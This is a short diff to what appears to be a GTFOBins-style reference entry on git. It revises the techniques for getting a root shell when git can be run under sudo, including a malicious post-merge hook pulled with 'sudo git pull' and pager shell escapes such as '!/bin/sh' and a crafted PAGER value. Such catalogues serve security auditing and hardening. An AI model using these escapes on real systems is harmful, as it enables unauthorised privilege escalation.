@@ -18,8 +18,8 @@ functions:
         !/bin/sh
     - description: This can be useful when only git pull is allowed sudo access. Any commands in the `post-merge` git hook of the repository which is pulled will be executed as root.
       code: |
-        sudo git branch --help config
-        !/bin/sh
+       git remote add <name> <repo with malicious post-merge hook>
+       sudo git pull <name>
   limited-suid:
     - code: PAGER='sh -c "exec sh 0<&1"' ./git -p help
 ---
